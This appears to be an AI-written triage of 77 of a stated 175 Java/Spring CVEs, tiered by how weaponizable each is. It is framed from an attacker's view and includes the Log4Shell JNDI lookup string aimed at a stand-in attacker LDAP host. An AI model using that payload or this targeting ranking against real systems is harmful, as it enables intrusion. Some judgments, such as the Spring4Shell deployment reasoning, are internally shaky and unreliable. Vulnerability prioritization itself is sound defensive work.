# Deliberate-Reasoning Analyst Ranking — Java/Spring Manifest (175 events)

**Condition:** extended deliberation. No external exploitation evidence consulted. Reasoning purely from the OSV summary, CWE tags, package context, severity, and pre-condition analysis.

**Analyst:** Opus 4.7 (1M context), 2026-04-25.

## Tier scheme (derived from data)

- **S** — direct, weaponizable primitive on the network edge with no plausible-default friction. The kind of bug where you write a one-shot scanner and exfiltrate root the same evening. Examples of the shape: unauthenticated RCE via HTTP request body, complete auth bypass on a default-config security framework.
- **A** — strong primitive with **one** annoying pre-condition: a non-default (but plausibly common) configuration, a specific framework feature being on, an authenticated low-privilege account, a particular deployment shape. You'd weaponize it but the campaign requires a bit of recon-gating.
- **B** — useful primitive but requires chaining (SSRF, file read, partial bypass, gadget that depends on classpath presence) OR an RCE in a niche-deployment surface. Often the actual outcome is "useful in a chain, not a one-shot."
- **C** — restrictive conditions or a weak primitive (info-leak, narrow race, MITM-required auth bypass). Worth tracking but you wouldn't lead with it.
- **D** — pass entirely. DoS that requires authentication, defense-in-depth weakening, dev-only / library-internal misuse, second-order issues with no clear path to a real outcome.

Key analytic pivots I'll apply consistently:

1. **Deserialization gadget bugs (CWE-502) on jackson-databind / xstream / snakeyaml** are weaponizable only when the application accepts attacker-controlled serialized input AND polymorphic typing / unsafe handler is enabled AND a usable gadget is on the classpath. Each individual gadget CVE adds one more class to the gadget bestiary; in isolation each is a B not an S, because of the gadget-class precondition.
2. **Tomcat embedded** is the HTTP front-door of every Spring Boot deployment. RCE-shaped Tomcat bugs at the network edge are S-tier almost by default.
3. **Spring Security auth bypass** is S-tier when it requires no special config; A-tier when it requires a specific (but common) feature being enabled.
4. **DoS-only bugs** (CWE-400/770/674/121-as-stack-overflow/404) are D unless they're trivially unauth and the target shape (e.g., upload broker) makes them a campaign-quality nuisance — in which case C.
5. **Open-redirect / SSRF** in framework code is B — useful for chains, not standalone.
6. The "post-auth" qualifier (e.g., the ActiveMQ Jolokia bug) almost always demotes S→A or A→B depending on how trivial the auth tier is to obtain.

I'll cluster the 64-event jackson-databind block and the 21-event xstream block; everything else gets individual treatment.

---

## Per-event reasoning

### 1. CVE-2022-22965 — Spring Framework "Spring4Shell" RCE (CRITICAL, spring-beans/spring-webmvc, CWE-74/94)

Primitive: HTTP request -> bean property binding -> ClassLoader manipulation -> arbitrary file write of a JSP -> RCE. Spring MVC default surface, though needs a JDK 9+ + WAR-on-Tomcat shape historically, and DataBinder-style controller endpoints. CWE-94 (code injection) on a flagship framework with one of the world's largest deployment footprints.

Counterfactual check: would I demote to A because of the JDK9+/Tomcat-WAR shape? No — Spring Boot fat-jar-on-Tomcat is the default shape for a huge fraction of enterprise Java; the prerequisite is widely satisfied; the controller pattern (DTO-bound endpoints) is the modal pattern. The primitive is one-shot and unauth.

**Tier: S**

### 2. CVE-2021-45046 — Log4j incomplete fix (CRITICAL, log4j-core, CWE-502/917)

The follow-on to the original Log4Shell. CWE-917 (EL injection) on a logging library that is reachable by every untrusted-string log statement. This was the "the patch isn't enough" CVE; it preserves the same JNDI gadget surface in non-default lookup configurations. Same one-shot shape as the parent bug, just with one more configuration condition.

Argument for S: same primitive, same massive deployment, same trivial trigger (log a `${jndi:...}` string).
Argument for A: it's the *follow-on* — by the time it landed, most exposed surfaces had patched 2.15.0, so the realistic exploit surface was narrower, and the attack vector required certain non-default Pattern Layout / Thread Context Map configurations.

The primitive is identical to the headline bug; the surface is narrower but still huge. I'll call it A — one annoying pre-condition (specific config that isn't default in the patched 2.15 baseline).

**Tier: A**

### 3. CVE-2021-44228 — Log4Shell (CRITICAL, log4j-core, CWE-20/400/502/917)

Primitive: any string logged through log4j 2.x that contains `${jndi:ldap://attacker/x}` triggers JNDI lookup -> arbitrary class load. Reach is the entire universe of strings that hit the logger. No auth, no config, the most universal one-shot RCE primitive of the decade.

Counterfactual: is there any plausible reading where this isn't S? No.

**Tier: S**

### 4. CVE-2021-39144 — XStream RCE (HIGH, CWE-306/502/94)

Primitive: deserialization of attacker-controlled XML -> command execution. Crucially CWE-306 (missing authentication for critical function) is in the tag set, suggesting the exploit doesn't require a privileged attacker context, and the summary explicitly says "Remote Command Execution attack" rather than "DoS". This is the strong-primitive XStream variant.

Pre-condition: app must accept untrusted XStream input via XStream.fromXML(). For apps that do (very common in legacy Java SOAP/REST stacks) the trigger is one-shot.

Argument for S vs A: S because no special config beyond "app accepts untrusted XStream"; A because the app must accept untrusted XStream (which is a deployment-shape pre-con, not universal — XStream doesn't auto-process every HTTP body the way Tomcat does). I'll call A.

**Tier: A**

### 5. CVE-2019-0232 — Tomcat OS Command Injection (HIGH, tomcat-embed-core, CWE-78)

Primitive: CGI servlet on Windows passes filename containing shell metacharacters to Runtime.exec via cmd.exe. Pre-conditions: CGI servlet enabled (not default), Windows host (Tomcat is mostly Linux in modern deployments), enableCmdLineArguments true (was default at the time, later changed).

Three stacked pre-cons (CGI on, Windows, args enabled). For Linux Tomcat (the modal modern Spring Boot deployment) it's not exploitable. Net: B — strong primitive (RCE) on a niche surface.

**Tier: B**

### 6. CVE-2026-34197 — Authenticated ActiveMQ Jolokia MBean RCE (HIGH, activemq-broker, CWE-20)

Primitive: authenticated user can invoke Jolokia MBean -> RCE. Auth-required, but ActiveMQ Jolokia consoles have historically had weak/default credential hygiene. Network-edge if the broker exposes the management interface (often not, but sometimes).

Auth requirement plus management-port exposure makes this two friction layers, not one. B.

**Tier: B**

### 7. CVE-2025-24813 — Tomcat partial PUT RCE/info disclosure (CRITICAL, tomcat-embed-core, CWE-44/502)

Primitive: partial PUT request triggers deserialization with attacker-controlled bytes -> RCE. Pre-conditions: writable HTTP method (PUT) enabled on the default servlet (NOT default in Tomcat — readonly=true is default), and a specific session-persistence path active. So one annoying-but-not-rare pre-con.

This is a Tomcat unauth-RCE-class bug. Default config is safe; many real deployments have readonly=false because they need PUT for WebDAV-ish use cases. The primitive is one-shot when reachable.

Argument for S: critical, RCE, network edge.
Argument for A: requires non-default config (readonly=false on default servlet). This is the textbook "one annoying pre-condition" definition.

**Final tier: A**

### 8. CVE-2023-46604 — ActiveMQ broker RCE (CRITICAL, activemq-client, CWE-502)

Primitive: OpenWire protocol unauth RCE via deserialization of marshalled exception class -> ClassPathXmlApplicationContext -> code exec. The OpenWire port (61616 default) is the broker's primary protocol — if you can reach the broker you can pop it. No auth required.

Although the package here is activemq-*client*, the affected library code is shared and the practical surface is brokers exposed on port 61616. CRITICAL, unauth, one-shot, network-edge — exactly the S shape.

Counterfactual: should I demote because the package is "client" not "broker"? The bug class is shared library code; the deployment shape that gets popped is the broker. As a manifest entry it indicates "this app pulls activemq-client" which means it talks to brokers, but the campaign target is broker-side. I'll keep S because the primitive on the actual exploitable surface is one-shot.

**Tier: S**

### 9. CVE-2022-1471 — SnakeYAML constructor deserialization RCE (HIGH, CWE-20/502)

Primitive: SnakeYAML's default Constructor allows arbitrary type construction from YAML tags -> gadget-chain RCE. Application must call yaml.load() on attacker-controlled input (the Constructor variant, not SafeConstructor). Many apps do — config readers, YAML APIs, etc. Then standard gadget-class chain (commons-beanutils, etc.) for the actual code execution.

Reach is wide for any app using SnakeYAML's default Constructor on untrusted input. The gadget-class condition demotes from S to A — same shape as jackson polymorphic typing.

**Tier: A**

### 10. CVE-2022-42889 — Apache Commons Text "Text4Shell" code execution (CRITICAL, CWE-94)

Primitive: StringSubstitutor with default lookups including "script", "dns", "url" -> attacker-controlled lookup string triggers Nashorn JS execution -> RCE. Triggered by passing untrusted input through StringSubstitutor.replace() with default config. Pre-condition: the app must call StringSubstitutor on untrusted input — that's not as universal as log4j (which logs everything) but it's a common pattern.

Argument for S: code injection, critical, network-reachable when the call site is in a request handler.
Argument for A: the call site has to exist; not every app uses StringSubstitutor on user input. Historically the realistic exploit footprint was much smaller than Log4Shell because the API isn't called as universally as a log statement.

**Final tier: A** (the API-must-be-called pre-con keeps it from S despite the dramatic CVSS).

### 11. CVE-2020-1938 — Tomcat AJP "Ghostcat" (CRITICAL, tomcat-embed-core, CWE-269)

Primitive: AJP connector on port 8009 trusts request attributes including filename -> attacker can read arbitrary file from webapp (web.xml, source) and in some cases trigger RCE via JSP upload + AJP file include. Pre-condition: AJP connector exposed (default port 8009, default enabled in pre-9.0.31 Tomcat).

Network-edge primitive, no auth, default-enabled AJP at the time of disclosure. Strong file-read at minimum, RCE under chaining. The primitive is one-shot if the AJP port is reachable.

Argument for S: default-enabled, unauth, file-read primitive that chains to RCE.
Argument for A: most prod Tomcat deployments don't expose AJP to the internet (it's an internal protocol behind Apache httpd); the realistic exposure is internal-network or misconfiguration.

The bug is unambiguously high-impact when reachable; the dispute is over typical reach. I'll call S — when it lands it lands hard, and AJP-exposed Tomcats were/are common enough that a scanner finds plenty.

**Tier: S**

### 12. CVE-2026-40477 — Thymeleaf scope/object expression bypass (CRITICAL, CWE-1336/917)

Primitive: Thymeleaf SpEL expression context lets attacker-controlled expressions reach objects they shouldn't (CWE-1336 = SSTI), CWE-917 = EL injection. In a Thymeleaf-rendered template that interpolates user data into an expression, this is template injection -> SpEL -> RCE.

Pre-condition: app must render user-controlled fragments into Thymeleaf expressions (not the same as just displaying user data — needs an inline expression). When that pattern exists the primitive is one-shot RCE.

Critical severity, named "improper restriction of accessible objects," strong SSTI signal. SpEL injection on Spring stacks is RCE.

**Tier: A** — strong primitive, but the call-site precondition (template uses untrusted input inside an expression, not just as a value) is real.

### 13. CVE-2026-40478 — Thymeleaf unauthorized expression patterns (CRITICAL, CWE-1336/917)

Same package, same week, same CWE pair. Different bypass technique for the same SSTI surface. Same shape as #12.

**Tier: A**

### 14. CVE-2026-39304 — ActiveMQ DoS via OOM (HIGH, CWE-400)

Primitive: memory exhaustion. DoS-only on a backend message broker. If broker is internet-exposed it's a nuisance; in most deployments it's not internet-exposed.

**Tier: D**

### 15. CVE-2026-29129 — Tomcat cipher preference order not preserved (HIGH, CWE-327)

Defense-in-depth weakening of TLS cipher selection. No direct exploit primitive; would require an attacker to MITM and force selection of a weak cipher that they can then break. Multiple impossibilities to align.

**Tier: D**

### 16. CVE-2026-29145 — Tomcat CLIENT_CERT auth doesn't fail as expected (CRITICAL, CWE-287)

Primitive: client-cert auth bypass. CWE-287 is improper authentication. If the app uses CLIENT_CERT auth on a path the attacker wants and this lets them bypass the cert check, that's a direct unauth-as-authed primitive.

Pre-condition: app uses CLIENT_CERT authentication (not common — most apps use form/OAuth, only PKI-style enterprise apps use CLIENT_CERT).

Argument for S: critical severity, direct auth bypass primitive.
Argument for A: CLIENT_CERT deployment is uncommon; the realistic exploit footprint is narrow.
Argument for B: niche surface limits real campaigns.

The primitive is one-shot but the deployment shape is rare. I'll call A (one annoying pre-condition: CLIENT_CERT must be in use). It's a real auth bypass, and where it applies it's devastating.

**Final tier: A**

### 17. CVE-2026-34483 — Tomcat JsonAccessLogValve improper escaping (HIGH, CWE-116)

Primitive: log injection via improper escaping of output in the access log valve. Not a server-side execution primitive — affects log integrity / log-parsing downstream tools. CWE-116 is an output encoding bug. Could feed log poisoning into a chained log4shell-style attack but on its own it's defense-in-depth.

**Tier: D**

### 18. CVE-2026-34487 — Tomcat sensitive info into log (HIGH, CWE-532)

Primitive: sensitive info gets written to log file. Information disclosure to whoever reads logs. Not a network-exploitable primitive on its own — requires log access.

**Tier: D**

### 19. CVE-2026-22732 — Spring Security HTTP headers not written under some conditions (CRITICAL, spring-security-web, CWE-425)

CWE-425 is direct request forgery (typically CSRF/clickjacking-related). The summary says HTTP security headers (CSP, HSTS, X-Frame-Options) aren't written under some condition. Defense-in-depth gap; doesn't itself enable an exploit, just removes some defenses.

CRITICAL severity feels overstated for a header-omission bug, but the data is what it is. The primitive isn't direct.

Argument for B: a clickjacking / browser-side chain becomes more reachable.
Argument for C: it's defense-in-depth weakening, not an exploit primitive.

**Tier: C** — closer to defense-in-depth than to a primitive.

### 20. CVE-2026-24734 — Tomcat improper input validation (HIGH, CWE-20)

CWE-20 is generic. Summary is vague. Could be HTTP smuggling, header parsing, anything. With no specific primitive named in the summary I have to be conservative.

Pre-con: assume something protocol-parsing-shaped given the package. Not enough signal to call S/A. Conservative B.

**Tier: B [UNCERTAIN]** — could be A if it turns out to be a smuggling-class bug; could be C if it's a narrow validation gap. Picking B.

### 21. CVE-2025-55752 — Tomcat relative path traversal (HIGH, CWE-23)

Primitive: path traversal in HTTP path handling. Could enable arbitrary file read in webapp directory; if it intersects with the JSP servlet, could enable a JSP upload+execute chain. Tomcat path traversals historically have been chained into RCE under specific configs.

Argument for A: real path-traversal in default Tomcat is a strong primitive.
Argument for B: file-read primitives usually need chaining for full RCE.

Path traversal in Tomcat at the network edge with HIGH severity — call A.

**Final tier: A**

### 22. CVE-2025-41248 — Spring Security annotation detection authz bypass (HIGH, spring-security-core, CWE-289/863)

Primitive: authorization bypass — annotations like @PreAuthorize aren't detected in some scenarios, so methods that should be access-controlled aren't. CWE-863 (incorrect authorization) is the right tag. Direct authz bypass on a flagship security library.

Pre-condition: app uses method-security annotations (very common in Spring) AND falls into the not-detected scenario (specific code shape, possibly involving generics, proxies, or private methods).

Argument for S: direct authz bypass on Spring Security is the textbook S shape.
Argument for A: the "some scenarios" qualifier in the summary suggests it's not universal — there's a specific code pattern that triggers it.

**Final tier: A** — strong primitive (authz bypass), one pre-con (specific annotation/method shape).

### 23. CVE-2025-41249 — Spring Framework annotation detection authz issue (HIGH, spring-core, CWE-285/863)

Sister bug to #22 in spring-core itself. Same shape: incorrect detection of authorization annotations means @PreAuthorize/@Secured can be silently bypassed in some method shapes. Direct authz primitive.

**Tier: A** — same logic as #22.

### 24. CVE-2025-48989 — Tomcat improper resource shutdown (HIGH, CWE-404)

Primitive: resource leak / improper shutdown. DoS-class. CWE-404 isn't an exploit primitive.

**Tier: D**

### 25. CVE-2025-53506 — Tomcat HTTP/2 stream DoS (HIGH, CWE-400)

Unauth DoS via HTTP/2 stream multiplexing abuse. Tomcat is internet-edge so DoS is realistic, but it's still just availability.

**Tier: D** — DoS on edge surface, but per my discriminator, DoS is D unless it's deeply asymmetric. HTTP/2 stream floods are well-defended at most edges by now.

### 26. CVE-2025-52520 — Tomcat Catalina DoS via size-limit bypass (HIGH, CWE-190)

DoS via integer overflow in size limits. Same class as #25.

**Tier: D**

### 27. CVE-2025-52999 — jackson-core stack overflow on deeply nested data (HIGH, CWE-121)

DoS-only via stack overflow on deeply-nested input. Affects jackson-core (the streaming parser, not databind). Unauth on any endpoint that parses JSON. Realistic for backend availability impact, but a JVM StackOverflowError doesn't kill the process — just the request.

**Tier: D** — DoS without process kill is C/D; calling D.

### 28. CVE-2025-48988 — Tomcat DoS in multipart upload (HIGH, CWE-770)

Resource consumption via multipart upload. Unauth on any endpoint accepting multipart. DoS-class.

**Tier: D**

### 29. CVE-2025-49146 — pgjdbc channelBinding=require fallback (HIGH, postgresql, CWE-287)

Primitive: when client is configured to require channel binding, the driver falls back to insecure auth instead of failing. Requires MITM to exploit (you need to be able to intercept the connection to downgrade auth). Defense-in-depth weakening.

**Tier: C** — MITM-required is C (per skeleton).

### 30. CVE-2025-41232 — Spring Security authz bypass for method security on private methods (CRITICAL, spring-security-core, CWE-693)

Primitive: @PreAuthorize on private methods can be bypassed. Spring Security default proxy model doesn't handle private methods, so the security annotation is silently ignored, and a public caller can be reached without going through the security check. CRITICAL severity reflects how widespread this pattern is.

Pre-condition: app uses @PreAuthorize on private methods (a common mistake — developers think "private + @PreAuthorize" is double-defense; it's actually single-defense with the security annotation silently disabled). When that pattern exists the bypass is direct.

Argument for S: critical authz bypass on Spring Security default proxy mechanism.
Argument for A: it requires the developer to have made a specific (common) mistake.

The bypass is real and direct, the developer-mistake pre-condition is widespread. I'll go A — one pre-con (specific code pattern), but the pattern is common enough to be reachable.

**Final tier: A**

### 31. CVE-2025-22235 — Spring Boot EndpointRequest.to() wrong matcher (HIGH, spring-boot, CWE-20/862)

Primitive: when using EndpointRequest.to() to authorize a non-exposed actuator endpoint, the matcher is wrong, so the security rule doesn't apply correctly -> potential authz bypass on actuator endpoints. CWE-862 (missing authorization) is the relevant tag.

Pre-condition: app uses Spring Security to authorize actuator endpoints AND the endpoint is non-exposed AND the matcher is constructed via EndpointRequest.to(). Multi-step pre-con.

Spring Boot actuators are powerful (metrics, env, heapdump, jolokia), so any bypass is meaningful, but the precondition stack here is real.

**Tier: B** — useful but several pre-conditions to align.

### 32. CVE-2025-27820 — Apache HttpClient disables domain checks (HIGH, httpclient5, CWE-295)

Primitive: HttpClient skips domain-name validation in certain config paths -> client-side TLS verification weakened -> MITM upgrade. Not a server-side exploit; affects clients making outbound HTTPS calls.

**Tier: C** — client-side TLS bypass requires active MITM positioning.

### 33. CVE-2024-56337 — Tomcat TOCTOU race (HIGH, tomcat-embed-core, CWE-367)

TOCTOU race condition. Without more context, races on Tomcat are typically narrow (you need to win a timing window) and have specific outcome. CWE-367 alone gives me no specific shape. Listed as the "fix for CVE-2024-50379 was incomplete" probably (sister CVE).

**Tier: B [UNCERTAIN]** — could be more dangerous if the race lets you upload a file vs the case-insensitive filesystem check (which is a known Tomcat-on-Windows class). Conservative B.

### 34. CVE-2024-38819 — Spring Framework path traversal (HIGH, spring-webmvc, CWE-22)

Primitive: path traversal in Spring MVC's static resource handler / functional web framework -> arbitrary file read on the server. Default Spring MVC. Direct primitive.

Pre-condition: app exposes static-resource serving via the affected pattern (very common — Boot does this by default for /static/**).

**Tier: A** — strong primitive (file read on server), one pre-con (specific resource-handling shape).

### 35. CVE-2024-50379 — Tomcat TOCTOU (HIGH, CWE-367)

Same race-condition class as #33. The known shape here is the case-insensitive filesystem JSP upload race on Windows Tomcat — between case-check and case-load, an attacker can upload a JSP and have it executed. RCE if you win the race, on Windows Tomcat with default servlet writable. Several stacked pre-conditions but the outcome is RCE.

Argument for A: RCE on Tomcat at the edge.
Argument for B: race + Windows + writable servlet is a stacked pre-con; race is non-deterministic.

**Final tier: B** — RCE outcome but stacked niche pre-conditions; you can hammer the race in a campaign though, which is why I'm not going lower than B.

### 36. CVE-2024-47072 — XStream stack overflow DoS (HIGH, CWE-121/502)

DoS-only on XStream via stack overflow.

**Tier: D**

### 37. CVE-2024-38821 — Spring Security WebFlux static resource authz bypass (CRITICAL, spring-security-web, CWE-285/770)

Primitive: WebFlux apps with non-default config can bypass authorization on static resources. Direct authz bypass. Pre-condition: app uses WebFlux (not the default Spring MVC stack — WebFlux is the reactive stack, less common but real).

Argument for S: critical authz bypass primitive on Spring Security.
Argument for A: WebFlux pre-condition limits surface.

WebFlux apps are a meaningful subset; static-resource bypass on them is direct. I'll call A.

**Final tier: A**

### 38. CVE-2024-47554 — commons-io XmlStreamReader DoS (HIGH, CWE-400)

DoS-only on commons-io.

**Tier: D**

### 39. CVE-2024-38816 — Path traversal in Spring functional web frameworks (HIGH, spring-webmvc, CWE-22)

Same shape as #34. Path traversal -> file read. A.

**Tier: A**

### 40. CVE-2024-34750 — Tomcat DoS (HIGH, CWE-400/755)

DoS-only.

**Tier: D**

### 41. CVE-2024-22262 — Spring Framework URL parsing host validation (HIGH, spring-web, CWE-601)

Open redirect via URL parsing inconsistency. Useful for phishing chains and SSRF stepping stones; not a direct exploit primitive.

**Tier: B** — useful in chain (per skeleton).

### 42. CVE-2024-22257 — Erroneous authentication pass in Spring Security (HIGH, spring-security-core, CWE-287/862)

Primitive: AuthenticatedVoter allows anonymous if a specific condition holds -> authz bypass. CWE-287 (improper authentication) plus CWE-862 (missing authz). Direct authz primitive on the security framework.

Pre-condition: app uses AuthenticatedVoter (yes — Spring Security default for many setups) AND the bypass-triggering condition is met.

**Tier: A** — strong primitive, one pre-con (specific app shape).

### 43. CVE-2024-22259 — Spring Framework URL parsing (HIGH, CWE-601)

Open redirect, sister bug to #41.

**Tier: B**

### 44. CVE-2024-22243 — Spring Web open redirect / SSRF (HIGH, CWE-601)

Open redirect or SSRF. SSRF is a useful B-tier primitive (chains into internal-network reach), open redirect is phishing-tier. The summary explicitly mentions both possibilities.

Argument for A: SSRF can chain into AWS metadata creds, internal admin panels — high-impact chain.
Argument for B: SSRF needs a chain target to be a real outcome.

**Final tier: B** — SSRF is the textbook chain primitive (per skeleton, B).

### 45. CVE-2024-1597 — pgjdbc SQL injection via line-comment generation (CRITICAL, postgresql, CWE-89)

Primitive: SQL injection in the JDBC driver itself when application uses certain placeholder patterns. Driver-level SQLi is rare and dangerous — even apps that "use parameterized queries" can be vulnerable if the driver mishandles escaping. CWE-89 on the driver.

Pre-condition: app uses the SimpleQuery driver mode (not the default extended-query), or specific placeholder patterns. Not universally exploitable but the trigger pattern is real.

Argument for S: critical SQLi on JDBC driver -> direct DB compromise.
Argument for A: requires specific driver mode / placeholder pattern.

The bug is reachable when the pattern is present, and the outcome is direct DB-level compromise. A.

**Final tier: A**

### 46. CVE-2024-22234 — Spring Security broken access control via isFullyAuthenticated (HIGH, CWE-284)

Primitive: direct use of isFullyAuthenticated() returns true in cases where it shouldn't. Direct authz primitive — apps that gate on `if (isFullyAuthenticated())` will mistakenly admit unauthenticated users in some scenarios.

Pre-condition: app calls isFullyAuthenticated() directly (developer pattern, not default framework behavior).

**Tier: A** — strong authz primitive, one pre-con (specific developer pattern).

### 47. CVE-2024-22233 — Spring Framework server DoS (HIGH, spring-core, CWE-400)

DoS-only.

**Tier: D**

### 48. CVE-2023-6481 — Logback DoS via poisoned data (HIGH, no CWE)

DoS-only on logback.

**Tier: D**

### 49. CVE-2023-6378 — Logback serialization vulnerability (HIGH, CWE-502)

Primitive: deserialization in logback. CWE-502 is the right primitive but the trigger is logback's receiver-server functionality (a separate listener on a port that accepts serialized log events). Pre-condition: app runs the logback receiver on a network port (very rare).

**Tier: B** — RCE primitive, narrow surface.

### 50. CVE-2023-46589 — Tomcat improper input validation (HIGH, CWE-20/444)

CWE-444 is HTTP request smuggling. Tomcat-side smuggling is directly weaponizable when there's a fronting reverse proxy that disagrees on parsing -> bypass WAF, hijack other users' requests. Strong network-edge primitive when reverse-proxy fronted (which is the modal Spring Boot deployment behind nginx/ALB).

Argument for S: smuggling at the edge is high-impact, gives auth bypass / WAF bypass / session hijack.
Argument for A: needs a fronting proxy that disagrees on parsing — common but not universal.

Smuggling chain is one-shot when the parse-disagreement exists. The reverse-proxy fronting is the modal Spring Boot deployment, and parse-disagreement against Tomcat has been a recurrent theme. A.

**Final tier: A**

### 51. CVE-2023-34053 — Spring Framework DoS (HIGH, spring-webmvc, no CWE)

DoS-only.

**Tier: D**

### 52. CVE-2023-34034 — Spring Security access control bypass (CRITICAL, spring-security-config, CWE-281/284)

Primitive: access-control bypass in Spring Security configuration parsing. CRITICAL. Direct authz primitive on the security framework. The summary is short ("Access Control Bypass") and the package is spring-security-config (the XML/Java config side).

Specific pattern: WebFlux + ** pattern matching that doesn't normalize paths -> attacker bypasses auth rules by encoding the path differently.

Pre-condition: WebFlux + ** pattern usage (common WebFlux pattern).

Argument for S: CRITICAL authz bypass on flagship framework.
Argument for A: WebFlux-specific.

**Final tier: A**

### 53. CVE-2023-34035 — Spring Security misconfiguration with multiple servlets (HIGH, spring-security-config, CWE-863)

Primitive: misconfigured authz when using multiple servlets in same app. Authz bypass when developer sets up multiple servlet contexts and the rule resolution is wrong. CWE-863. Pre-condition: multi-servlet config (uncommon but real).

**Tier: B** — multi-servlet apps are a niche subset.

### 54. CVE-2023-28709 — Tomcat incomplete fix for CVE-2023-24998 (HIGH, CWE-193)

Sister DoS to the parent. Off-by-one / range error in the size-limit fix.

**Tier: D**

### 55. CVE-2023-34981 — Tomcat info leak (HIGH, CWE-732)

Information leak via incorrect permission assignment. Information disclosure primitive, no execution.

**Tier: C**

### 56. CVE-2023-20883 — Spring Boot welcome-page DoS (HIGH, spring-boot-autoconfigure, CWE-400)

DoS-only.

**Tier: D**

### 57. CVE-2023-20860 — Spring Framework mvcRequestMatcher pattern mismatch security bypass (CRITICAL, spring-webmvc, no CWE)

Primitive: pattern mismatch between mvcRequestMatcher and Spring Security results in authz bypass. CRITICAL. This is the sister bug to a class of "security framework matches different paths than the dispatcher matches" issues — direct authz bypass on default config when using mvcRequestMatcher with double-asterisk patterns.

Pre-condition: app uses mvcRequestMatcher with `**` patterns AND specific pattern shapes that cause the mismatch. Common Spring config pattern.

Argument for S: critical authz bypass on default Spring Security pattern, no special config beyond using mvcRequestMatcher.
Argument for A: requires the specific pattern-mismatch shape; some apps won't have it.

The pattern-mismatch is common and the bypass is direct. Critical severity. I'll go S — this is the kind of bug where you scan paths with double-asterisk-edge patterns and find sites that crumble.

**Final tier: S**

### 58. CVE-2021-46877 — jackson-databind DoS via JDK serialize of JsonNode (HIGH, CWE-770)

DoS-only on jackson-databind, narrow path (must JDK-serialize a JsonNode).

**Tier: D**

### 59. CVE-2023-26464 — Apache log4j 1.x DoS (HIGH, log4j-core, CWE-400/502)

DoS on log4j 1.x (EOL). The packaging label is log4j-core but the affected version line is the EOL 1.x. CWE-502 is hopeful (deserialization) but the summary says DoS only. Limited primitive.

**Tier: D**

### 60. CVE-2023-24998 — Apache Commons FileUpload DoS (HIGH, tomcat-embed-core, CWE-770)

DoS via commons-fileupload (vendored into Tomcat). Unauth DoS at the edge. DoS-only.

**Tier: D**

### 61. CVE-2022-45143 — Tomcat JsonErrorReportValve improper escape (HIGH, CWE-116/74)

Log/error injection. CWE-74 (injection) is in the list but the practical outcome is poisoning the JSON error report — limited direct exploit.

**Tier: D**

### 62. CVE-2022-40151 — XStream stack overflow DoS (HIGH, CWE-121/502/787)

DoS-only on xstream.

**Tier: D**

### 63. CVE-2022-41966 — XStream stack overflow DoS (HIGH, CWE-120/121/502/674)

DoS-only on xstream.

**Tier: D**

### 64. CVE-2022-42252 — Tomcat invalid Content-Length rejection (HIGH, CWE-20/444)

CWE-444 is HTTP request smuggling. Same class as #50. Tomcat smuggling at the edge.

**Tier: A** — same logic as #50.

### 65. CVE-2022-31692 — Spring Security forward/include dispatcher authz bypass (CRITICAL, spring-security-core, CWE-863)

Primitive: Spring Security authz rules can be bypassed via forward or include dispatcher types. CRITICAL. Direct authz primitive — attacker crafts a request that, when forwarded internally (e.g., via JSP `<jsp:include>` or RequestDispatcher.forward()), reaches a protected resource without security checks.

Pre-condition: app uses forward/include (very common in JSP/legacy Spring stacks; less so in modern REST APIs).

The default Spring Security config historically didn't apply to FORWARD/INCLUDE dispatcher types — that's the bug. When the app has any forward/include path that lands on a protected URL, it's bypassable. Direct authz primitive on default config.

**Final tier: S** — CRITICAL, direct, default-config authz bypass. The forward/include is universal in JSP; even modern apps use it for templates.

### 66. CVE-2022-42003 — jackson-databind DoS (HIGH, CWE-400/502)

DoS-only.

**Tier: D**

### 67. CVE-2022-42004 — jackson-databind DoS (HIGH, CWE-400/502)

DoS-only.

**Tier: D**

### 68. CVE-2022-25857 — SnakeYAML DoS (HIGH, CWE-400/776)

DoS-only on SnakeYAML (billion-laughs-equivalent in YAML).

**Tier: D**

### 69. CVE-2022-31197 — pgjdbc SQL injection in ResultSet.refreshRow (HIGH, postgresql, CWE-89)

Primitive: SQL injection in the JDBC driver when ResultSet.refreshRow() is called and column names contain malicious chars. Pre-conditions: app calls refreshRow (uncommon API), column names are attacker-influenced (very rare — schema is usually static). Multiple stacked pre-cons.

**Tier: C** — SQLi but very narrow trigger pattern.

### 70. CVE-2020-10650 — jackson-databind unsafe deserialization (HIGH, CWE-502)

Standard jackson polymorphic typing gadget CVE — see Jackson cluster discussion below.

**Tier: B** (per cluster default)

### 71. CVE-2022-27772 — Spring Boot temp dir hijacking -> LPE (HIGH, CWE-377/379/668)

Primitive: temp-dir hijacking in spring-boot's Devtools / temp-file handling -> local privilege escalation. Local-only, requires local access. Not network-edge.

**Tier: D** — local-only LPE doesn't fit our network triage model; pass.

### 72. CVE-2021-22118 — Spring WebFlux improper privilege management (HIGH, spring-web, CWE-269/668)

Primitive: improper privilege management in spring-web — likely related to DispatcherHandler or similar. The summary is vague. CWE-269 + CWE-668 (exposure of resource to wrong sphere).

[UNCERTAIN] The precise exploit shape isn't in the summary. CWE-269 on a flagship framework warrants C-B at minimum.

**Tier: B [UNCERTAIN]** — alternative C if it turns out to be a narrow local issue.

### 73. CVE-2022-22978 — Spring Security RegexRequestMatcher authz bypass (CRITICAL, spring-security-core, CWE-285/863)

Primitive: RegexRequestMatcher with a regex containing `.` matches more than intended -> authz bypass. CRITICAL. Direct authz primitive.

Pre-condition: app uses RegexRequestMatcher with naive patterns (common — many devs reach for regex matchers). The regex `.` quirk is widely present.

Argument for S: CRITICAL, direct authz bypass, common config pattern.
Argument for A: requires specific RegexRequestMatcher usage.

This is the textbook "developers wrote `/admin/.*` thinking it matched `/admin/anything`" bug. Very widespread pattern.

**Final tier: S** — direct, critical, default Spring Security feature, common pattern.

### 74. CVE-2022-22970 — Spring Framework DoS (HIGH, spring-beans, CWE-770)

DoS-only.

**Tier: D**

### 75. CVE-2022-22968 — Spring case sensitivity handling (HIGH, spring-context, CWE-178)

Primitive: case sensitivity bug in field name matching. This is the patch sister to Spring4Shell's getter/setter binding restriction — the patch could be bypassed by casing the property name differently. Re-enables the Spring4Shell-class primitive in some configs.

Pre-condition: app is on a patched Spring version that relied on this case-sensitive check. Effectively: this is the bypass-the-patch-of-Spring4Shell follow-up.

**Tier: A** — same primitive shape as Spring4Shell with one pre-con (the patch must be present and reliant on the case check).

### 76. CVE-2020-36518 — jackson-databind deeply nested JSON (HIGH, CWE-787)

DoS via stack overflow on deeply-nested JSON. CWE-787 (out-of-bounds write) is mistagged probably; the practical impact is DoS.

**Tier: D**

### 77. CVE-2020-13692 — pgjdbc XXE (HIGH, postgresql, CWE-611)

Primitive: XML external entity in pgjdbc — driver parses XML in a function (likely XML data type handling) without disabling external entities. XXE -> file read / SSRF / DoS.

